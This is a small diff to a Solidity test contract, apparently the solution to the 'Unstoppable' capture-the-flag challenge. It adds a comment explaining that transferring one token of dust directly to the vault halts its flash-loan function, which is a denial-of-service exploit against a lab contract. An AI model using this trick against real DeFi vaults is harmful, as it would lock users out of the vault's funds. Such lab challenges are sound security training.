@@ -94,6 +94,7 @@ contract UnstoppableChallenge is Test {
         public 
         checkSolvedByPlayer 
     {
+        // transfer dust directly to the vault will halt the flashloan functionality
         token.transfer(address(vault), 1);
     }
 
